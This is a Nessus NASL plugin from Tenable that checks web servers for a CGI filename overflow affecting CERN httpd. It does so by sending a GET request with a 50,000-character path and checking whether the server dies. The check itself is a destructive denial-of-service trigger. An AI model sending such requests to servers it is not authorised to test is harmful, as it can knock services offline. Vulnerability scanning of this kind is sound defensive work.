#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(17231);
 script_version("$Revision: 1.21 $");
 script_cvs_date("$Date: 2017/03/21 03:23:57 $");

 script_osvdb_id(58152);

 script_name(english:"CERN httpd CGI Name Handling Remote Overflow");
 script_summary(english:"Ask for a too long CGI name containing a dot");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server may be affected by a buffer overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote web server stopped responding after sending it a GET
request for a CGI script with a arbitrary long file name. This is
known to trigger a heap overflow in some servers like CERN HTTPD. An
attacker may use this flaw to disrupt the remote service and possibly
even run malicious code on the affected host subject to the privileges
under which the service operates.");
 script_set_attribute(attribute:"solution", value:"Contact the vendor for a patch or move to another server.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_set_attribute(attribute:"plugin_publication_date", value:"2005/02/28");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 # script_require_keys("www/cern");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

# I never tested it against a vulnerable server

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(1, "The web server on port "+port+" is already dead.");

foreach dir (cgi_dirs())
{
  d = strcat(dir, '/A.', crap(50000));
  r = http_send_recv3(method: "GET", item:d, port:port, exit_on_fail: 0);
  if (isnull(r) && http_is_dead(port:port, retry: 3))
  {
    debug_print('HTTP server was killed by GET http://', get_host_name(), ':',
	port, '/', dir, '/A.AAAAAAA[...]A\n');
    security_hole(port);
    exit(0);
  }
}

exit(0, "The web server on port "+port+" is unaffected.");
